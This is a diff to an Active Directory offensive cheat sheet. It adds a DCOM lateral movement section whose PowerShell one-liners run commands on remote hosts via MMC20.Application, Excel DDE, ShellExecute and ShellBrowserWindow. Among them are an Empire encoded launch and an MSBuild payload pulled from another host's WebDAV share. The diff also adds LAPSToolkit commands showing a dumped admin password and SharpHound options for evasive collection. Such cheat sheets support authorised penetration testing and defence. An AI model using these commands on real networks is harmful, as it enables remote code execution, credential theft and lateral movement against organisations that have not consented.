@@ -66,6 +66,10 @@
       - [ReadLAPSPassword](#readlapspassword)
       - [ReadGMSAPassword](#readgmsapassword)
       - [ForceChangePassword](#forcechangepassword)
+    - [DCOM Exploitation](#dcom-exploitation)
+      - [DCOM via MMC Application Class](#dcom-via-mmc-application-class) 
+      - [DCOM via Excel](#dcom-via-excel)
+      - [DCOM via ShellExecute](#dcom-via-shellexecute)
     - [Trust relationship between domains](#trust-relationship-between-domains)
     - [Child Domain to Forest Compromise - SID Hijacking](#child-domain-to-forest-compromise---sid-hijacking)
     - [Forest to Forest Compromise - Trust Ticket](#forest-to-forest-compromise---trust-ticket)
@@ -199,9 +203,9 @@ use [BloodHound](https://github.com/BloodHoundAD/BloodHound)
 .\SharpHound.exe -c all -d active.htb -SearchForest
 .\SharpHound.exe --EncryptZip --ZipFilename export.zip
 .\SharpHound.exe -c all,GPOLocalGroup
-.\SharpHound.exe -c all --LDAPUser <UserName> --LDAPPass <Password> --JSONFolder <PathToFile>
-.\SharpHound.exe -c all -d active.htb --LDAPUser <UserName> --LDAPPass <Password> --domaincontroller 10.10.10.100
-
+.\SharpHound.exe -c all --LdapUsername <UserName> --LdapPassword <Password> --JSONFolder <PathToFile>
+.\SharpHound.exe -c all -d active.htb --LdapUsername <UserName> --LdapPassword <Password> --domaincontroller 10.10.10.100
+.\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\Windows\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties --throttle 10000 --jitter 23
 
 # or run the collector on the machine using Powershell
 # https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
@@ -1091,6 +1095,17 @@ Get-AuthenticodeSignature 'c:\program files\LAPS\CSE\Admpwd.dll'
     PS > Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime
     ```
 
+* LAPSToolkit - https://github.com/leoloobeek/LAPSToolkit
+    ```powershell
+    $ Get-LAPSComputers
+    ComputerName                Password                                 Expiration         
+    ------------                --------                                 ----------         
+    exmaple.domain.local        dbZu7;vGaI)Y6w1L                         02/21/2021 22:29:18
+
+    $ Find-LAPSDelegatedGroups
+    $ Find-AdmPwdExtendedRights
+    ```
+
 * ldapsearch
     ```powershell
     ldapsearch -x -h  -D "@" -w  -b "dc=<>,dc=<>,dc=<>" "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))" ms-MCS-AdmPwd`
@@ -1711,6 +1726,58 @@ $NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
 Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
 ```
 
+
+### DCOM Exploitation
+
+> DCOM is an extension of COM (Component Object Model), which allows applications to instantiate and access the properties and methods of COM objects on a remote computer
+
+
+#### DCOM via MMC Application Class 
+
+This COM object (MMC20.Application) allows you to script components of MMC snap-in operations. there is a method named **"ExecuteShellCommand"** under **Document.ActiveView**.
+
+```ps1
+PS C:\> $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.1"))
+PS C:\> $com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\calc.exe",$null,$null,7)
+PS C:\> $com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",$null,"-enc DFDFSFSFSFSFSFSFSDFSFSF < Empire encoded string > ","7")
+
+# Weaponized example with MSBuild
+PS C:\> [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.1")).Document.ActiveView.ExecuteShellCommand("c:\windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",$null,"\\10.10.10.2\webdav\build.xml","7")
+```
+
+Invoke-MMC20RCE : https://raw.githubusercontent.com/n0tty/powershellery/master/Invoke-MMC20RCE.ps1
+
+#### DCOM via Excel
+
+```ps1
+# Powershell script that injects shellcode into excel.exe via ExecuteExcel4Macro through DCOM
+Invoke-Excel4DCOM64.ps1 https://gist.github.com/Philts/85d0f2f0a1cc901d40bbb5b44eb3b4c9
+Invoke-ExShellcode.ps1 https://gist.github.com/Philts/f7c85995c5198e845c70cc51cd4e7e2a
+
+# Using Excel DDE
+PS C:\> $excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "$ComputerName"))
+PS C:\> $excel.DisplayAlerts = $false
+PS C:\> $excel.DDEInitiate("cmd", "/c calc.exe")
+```
+
+#### DCOM via ShellExecute
+
+```ps1
+$com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"10.10.10.1")
+$obj = [System.Activator]::CreateInstance($com)
+$item = $obj.Item()
+$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
+```
+
+#### DCOM via ShellBrowserWindow
+
+:warning: Windows 10 only, the object doesn't exists in Windows 7
+
+```ps1
+$com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',"10.10.10.1")
+$obj = [System.Activator]::CreateInstance($com)
+$obj.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
+```
 
 ### Trust relationship between domains
 
@@ -2403,3 +2470,5 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [CVE-2020-17049: Kerberos Bronze Bit Attack – Theory - Jake Karnes - December 8th, 2020](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/)
 * [Kerberos Bronze Bit Attack (CVE-2020-17049) Scenarios to Potentially Compromise Active Directory](https://www.hub.trimarcsecurity.com/post/leveraging-the-kerberos-bronze-bit-attack-cve-2020-17049-scenarios-to-compromise-active-directory)
 * [GPO Abuse: "You can't see me" - Huy Kha -  July 19, 2019](https://pentestmag.com/gpo-abuse-you-cant-see-me/)
+* [Lateral movement via dcom: round 2 - enigma0x3 - January 23, 2017](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
+* [New lateral movement techniques abuse DCOM technology - Philip Tsukerman - Jan 25, 2018](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)
